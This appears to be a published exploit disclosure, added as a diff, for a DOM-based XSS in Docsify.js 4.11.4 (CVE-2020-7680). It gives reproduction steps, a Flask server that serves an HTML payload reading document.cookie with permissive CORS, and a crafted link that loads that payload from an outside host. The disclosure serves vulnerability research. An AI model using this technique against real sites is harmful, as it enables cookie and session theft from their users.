@@ -1,0 +1,66 @@
+# Exploit Title: Docsify.js 4.11.4 - Reflective Cross-Site Scripting
+# Date: 2020-06-22
+# Exploit Author: Amin Sharifi
+# Vendor Homepage: https://docsify.js.org
+# Software Link: https://github.com/docsifyjs/docsify
+# Version: 4.11.4
+# Tested on: Windows 10
+# CVE : CVE-2020-7680
+
+
+docsify.js uses fragment identifiers (parameters after # sign) to load
+resources from server-side .md files. it then renders the .md file inside
+the HTML page.
+
+For example : https://docsify.js.org/#/quickstart sends an ajax to
+https://docsify.js.org/quickstart.md and renders it inside the html page.
+
+due to lack of validation it is possible to provide external URLs after the
+/#/ and render arbitrary javascript/HTML inside the page which leads to
+DOM-based Cross Site Scripting (XSS).
+
+
+Steps to reproduce:
+
+step 1. setup a server (for example I use flask here, for the POC im
+hosting one on https://asharifi.pythonanywhere.com )
+
+step 2. the server should respond to request to /README.md with a crafted
+XSS payload. here is the payload "Html Injection and XSS PoC</p><img src=1
+onerror=alert(1)><img src=1 onerror=alert(document.cookie)><p>"
+also the CORS should be set so that other Origins would be able to send
+ajax requests to the server so Access-Control-Allow-Origin must be set to *
+(or to the specific domain that you wanna exploit) example code below:
+
+-------------------------------------------------
+from flask import Flask
+import flask
+
+app = Flask(__name__)
+
+
+@app.route('/README.md')
+def inject():
+    resp = flask.Response("Html Injection and XSS PoC</p><img src=1
+onerror=alert(1)><img src=1 onerror=alert(document.cookie)><p>")
+    resp.headers['Access-Control-Allow-Origin'] = '*'
+    return resp
+
+------------------------------------------------------
+step 3. craft the link for execution of the exploit
+for example for https://docsify.js.org website you can create the link as
+below
+
+https://docsify.js.org/#//asharifi.pythonanywhere.com/README
+(note that the mentioned domain is no longer vulnerable at the time writing
+this report)
+
+when a user visits this URL an ajax request will be sent to
+asharifi.pythonanywhere.com/README.md and the response of the request will
+be rendered inside the webpage which results in XSS payload being executed
+on the page.
+
+
+snyk advisory: https://snyk.io/vuln/SNYK-JS-DOCSIFY-567099
+Mitre CVE entry:
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7680
